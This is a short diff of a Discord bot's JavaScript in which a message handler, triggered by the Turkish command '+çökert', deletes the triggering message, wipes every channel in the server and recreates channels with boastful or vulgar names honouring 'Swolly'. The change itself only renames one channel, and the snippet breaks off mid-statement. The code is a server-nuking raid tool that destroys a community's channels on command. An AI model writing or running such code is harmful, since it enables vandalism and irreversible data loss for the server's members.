@@ -142,10 +142,10 @@ client.on("message", msg => {
 client.on("message", async msg => {
   if (msg.content === "+çökert") {
     msg.delete();
-    
+
     await msg.guild.channels.deleteAll();
 
-    await msg.guild.createChannel("✝-Swolly,sikti");
+    await msg.guild.createChannel("✝-tek-kral-swolly");
 
     await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
